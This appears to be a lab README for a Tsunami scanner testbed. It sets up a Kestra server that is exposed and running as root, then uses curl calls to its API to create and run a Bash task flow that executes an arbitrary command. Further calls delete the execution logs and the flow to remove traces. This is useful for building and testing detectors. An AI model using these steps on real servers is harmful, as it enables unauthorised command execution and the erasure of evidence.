# Prerequisites
- Docker installed on your machine.
- port 8080 available on your host machine.

# Vulnerable setup
```bash
docker run --pull=always --rm -it -p 8080:8080 --user=root \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /tmp:/tmp kestra/kestra:latest server local
```
## exploitation
1. replace `echo ""` with the command you want to run in the `bash` task.
```bash
# create a flow with a bash task
curl 'http://127.0.0.1:8080/api/v1/main/flows' \
-X POST \
-H 'Content-Type: application/x-yaml' \
--data-raw $'id: tsunami_security_scanner\nnamespace: company.team\n\ntasks:\n  - id: bash\n    type: "io.kestra.core.tasks.scripts.Bash"\n    commands:\n      - \'echo ""\'\n'

# execute the flow
curl 'http://127.0.0.1:8080/api/v1/main/executions/company.team/tsunami_security_scanner' -X POST 
# {"id":"7KOr7TfHgiVUOqmOG3Ng5f","namespace":"company.team",....

# id from the response is the execution id, you can use it to delete the execution and its logs.
curl 'http://127.0.0.1:8080/api/v1/main/executions/7OeXTbNMm3vwyHOjpHEPGh?deleteLogs=true&deleteMetrics=true&deleteStorage=true' -X DELETE 

# delete the flow
curl 'http://127.0.0.1:8080/api/v1/main/flows/delete/by-ids' \
  -X DELETE \
  -H 'Content-Type: application/json' \
  --data-raw $'[{"id":"tsunami_security_scanner","namespace":"company.team","enabled":true}]'

```